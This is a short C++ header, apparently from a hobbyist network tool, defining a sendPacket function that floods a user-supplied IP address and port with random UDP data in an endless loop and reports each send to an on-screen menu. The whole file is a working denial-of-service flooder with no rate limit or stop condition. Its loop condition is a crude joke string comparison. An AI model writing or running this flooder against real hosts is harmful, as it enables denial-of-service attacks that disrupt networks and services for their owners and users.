#pragma once
#include <python3.7/Python.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <random>
#include "..//Addons/drawing.hpp"

void sendPacket(std::string Ip, std::string Port){

    int sockfd;
    int buffer[255];
    struct sockaddr_in address;

    Menu draw;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(Ip.c_str());
    address.sin_port = htons(std::atoi(Port.c_str()));

    connect(sockfd, (struct sockaddr *)&address, sizeof(address));

    while ("Gay" == "Gay"){
        for (int i = 0; i < 255; i++){
        buffer[i] = rand();
    }
        write(sockfd,buffer,sizeof(buffer));
        draw.drawSendPacket(sizeof(buffer));
    }
}

